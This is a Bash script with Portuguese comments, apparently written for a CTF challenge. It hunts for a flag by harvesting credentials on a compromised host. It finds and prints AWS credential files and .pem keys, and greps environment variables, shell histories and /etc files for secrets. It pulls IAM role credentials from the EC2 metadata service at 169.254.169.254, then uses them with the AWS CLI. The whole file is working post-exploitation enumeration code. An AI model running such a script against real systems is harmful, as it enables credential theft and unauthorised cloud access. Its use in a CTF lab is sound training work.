#!/bin/bash
# Script para buscar a chave do segundo módulo do CTF
# Baseado nas informações do linpeas do adalberto

echo "=========================================="
echo "Busca pela Chave do Segundo Módulo CTF"
echo "=========================================="
echo ""

OUTPUT_FILE="busca_chave_resultados.txt"
> "$OUTPUT_FILE"

echo "[*] Resultados serão salvos em: $OUTPUT_FILE"
echo ""

# 1. Buscar por arquivos relacionados a AWS
echo "[1] Buscando arquivos relacionados a AWS..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
find /home -name "*.pem" -o -name "*aws*" -o -name "*credential*" 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
find /root -name "*.pem" -o -name "*aws*" -o -name "*credential*" 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
find /tmp -name "*.pem" -o -name "*aws*" -o -name "*credential*" 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# 2. Verificar diretórios .aws
echo "[2] Verificando diretórios .aws..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
for dir in /root /home/*; do
    if [ -d "$dir/.aws" ]; then
        echo "  Encontrado: $dir/.aws" | tee -a "$OUTPUT_FILE"
        ls -la "$dir/.aws/" 2>/dev/null | tee -a "$OUTPUT_FILE"
        if [ -f "$dir/.aws/credentials" ]; then
            echo "  Conteúdo de credentials:" | tee -a "$OUTPUT_FILE"
            cat "$dir/.aws/credentials" | tee -a "$OUTPUT_FILE"
        fi
        if [ -f "$dir/.aws/config" ]; then
            echo "  Conteúdo de config:" | tee -a "$OUTPUT_FILE"
            cat "$dir/.aws/config" | tee -a "$OUTPUT_FILE"
        fi
    fi
done
echo "" | tee -a "$OUTPUT_FILE"

# 3. Buscar por strings relacionadas a chaves/modules
echo "[3] Buscando por strings relacionadas a 'chave', 'key', 'module', 'módulo'..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
grep -r -i "chave\|key.*module\|segundo.*módulo\|module.*key" /home 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
grep -r -i "chave\|key.*module\|segundo.*módulo\|module.*key" /root 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
grep -r -i "chave\|key.*module\|segundo.*módulo\|module.*key" /tmp 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# 4. Verificar variáveis de ambiente relacionadas a AWS
echo "[4] Verificando variáveis de ambiente AWS..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
env | grep -i aws | tee -a "$OUTPUT_FILE"
env | grep -i credential | tee -a "$OUTPUT_FILE"
env | grep -i key | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# 5. Tentar obter credenciais do metadata service
echo "[5] Tentando obter credenciais do metadata service da EC2..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
METADATA_BASE="http://169.254.169.254/latest/meta-data"
IAM_BASE="http://169.254.169.254/latest/meta-data/iam/security-credentials"

# Verificar se metadata service está acessível
if curl -s --max-time 2 "${METADATA_BASE}/instance-id" > /dev/null 2>&1; then
    echo "  Metadata service está acessível!" | tee -a "$OUTPUT_FILE"
    INSTANCE_ID=$(curl -s "${METADATA_BASE}/instance-id" 2>/dev/null)
    echo "  Instance ID: $INSTANCE_ID" | tee -a "$OUTPUT_FILE"
    
    IAM_ROLE=$(curl -s "${IAM_BASE}/" 2>/dev/null | head -1)
    if [ ! -z "$IAM_ROLE" ]; then
        echo "  IAM Role: $IAM_ROLE" | tee -a "$OUTPUT_FILE"
        CREDENTIALS=$(curl -s "${IAM_BASE}/${IAM_ROLE}" 2>/dev/null)
        echo "$CREDENTIALS" | tee -a "$OUTPUT_FILE"
    else
        echo "  Nenhum IAM role encontrado" | tee -a "$OUTPUT_FILE"
    fi
else
    echo "  Metadata service não está acessível (normal em containers Docker)" | tee -a "$OUTPUT_FILE"
    echo "  Tentando obter credenciais do host..." | tee -a "$OUTPUT_FILE"
    
    # Tentar acessar via host network
    if [ -d "/proc/sys/net" ]; then
        HOST_IP=$(ip route | grep default | awk '{print $3}' | head -1)
        echo "  Gateway/Host IP: $HOST_IP" | tee -a "$OUTPUT_FILE"
    fi
fi
echo "" | tee -a "$OUTPUT_FILE"

# 6. Verificar se AWS CLI está instalado
echo "[6] Verificando AWS CLI..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
if command -v aws &> /dev/null; then
    echo "  AWS CLI está instalado!" | tee -a "$OUTPUT_FILE"
    aws --version | tee -a "$OUTPUT_FILE"
    
    # Tentar listar recursos
    echo "  Tentando listar recursos..." | tee -a "$OUTPUT_FILE"
    aws sts get-caller-identity 2>&1 | tee -a "$OUTPUT_FILE"
    aws s3 ls 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
    aws ec2 describe-instances --region us-east-1 2>&1 | head -50 | tee -a "$OUTPUT_FILE"
else
    echo "  AWS CLI não está instalado" | tee -a "$OUTPUT_FILE"
fi
echo "" | tee -a "$OUTPUT_FILE"

# 7. Buscar por flags relacionadas ao segundo módulo
echo "[7] Buscando flags relacionadas ao segundo módulo..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
grep -r -i "Solyd.*module\|Solyd.*módulo\|segundo.*module\|segundo.*módulo" /home 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
grep -r -i "Solyd.*module\|Solyd.*módulo\|segundo.*module\|segundo.*módulo" /root 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
find / -name "*flag*" -o -name "*module*" -o -name "*módulo*" 2>/dev/null | grep -v proc | grep -v sys | head -30 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# 8. Verificar histórico de comandos
echo "[8] Verificando histórico de comandos..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
for hist_file in ~/.bash_history /root/.bash_history /home/*/.bash_history; do
    if [ -f "$hist_file" ]; then
        echo "  Histórico: $hist_file" | tee -a "$OUTPUT_FILE"
        grep -i "aws\|credential\|key\|module\|módulo\|chave" "$hist_file" 2>/dev/null | tail -20 | tee -a "$OUTPUT_FILE"
    fi
done
echo "" | tee -a "$OUTPUT_FILE"

# 9. Verificar processos e conexões relacionadas a AWS
echo "[9] Verificando processos e conexões relacionadas a AWS..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
ps aux | grep -i "aws\|credential\|key" | grep -v grep | tee -a "$OUTPUT_FILE"
netstat -antp 2>/dev/null | grep -i "aws\|amazon" | tee -a "$OUTPUT_FILE"
ss -antp 2>/dev/null | grep -i "aws\|amazon" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# 10. Verificar arquivos de configuração do sistema
echo "[10] Verificando arquivos de configuração do sistema..."
echo "-----------------------------------" | tee -a "$OUTPUT_FILE"
find /etc -name "*aws*" -o -name "*credential*" 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
for config_file in /etc/environment /etc/profile /etc/bash.bashrc; do
    if [ -f "$config_file" ]; then
        echo "  Verificando: $config_file" | tee -a "$OUTPUT_FILE"
        grep -i "aws\|credential\|key" "$config_file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done
echo "" | tee -a "$OUTPUT_FILE"

echo "=========================================="
echo "Busca concluída!"
echo "Resultados salvos em: $OUTPUT_FILE"
echo "=========================================="
